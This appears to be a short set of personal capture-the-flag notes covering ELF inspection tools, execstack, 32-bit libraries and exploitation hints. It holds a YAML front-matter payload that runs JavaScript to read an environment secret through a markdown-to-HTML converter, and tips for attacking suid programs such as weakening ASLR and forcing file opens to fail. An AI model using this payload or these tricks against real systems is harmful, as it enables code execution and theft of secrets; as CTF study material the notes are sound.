# Python code to HTML (w/ linenos)

	$ pbpaste | pygmentize -f html -l python -O linenos=1 | pbcopy

# Challenge: Exploitation-300-ish
## execstack - tool to set, clear, or query executable stack flag of ELF binaries and shared libraries

	$ sudo apt-get install execstack; execstack ish
	 -q --query: Query executable stack marking of binaries and shared libraries.
	 For each file it prints either:
	  * - when executable stack is not required,
	  * X when executable stack is required or
	  * ? when it is unknown (missing marking)

## install x86 lib

	$ sudo apt-get install libc6-i386 lib32stdc++6 lib32gcc1 lib32ncurses5 lib32z1

## tools to inspect ELF binary

	$ `file`; `size`; `ldd`; `readelf -a`; `stace`; `objdump -D`

(?) accept() on behalf of an open server socket

# exploit: markdown-to-html converter

	---
	a: !!js/function function(){ return(process.env.FLAG) }()
	---
	{{a}}

# exploit suid program

* `ulimit -s unlimited`: disable ASLR
* send SIGXXX?
* `ulimit -n 3`: cause fopen()'s to fail
* monitor /tmp
* sniff traffic
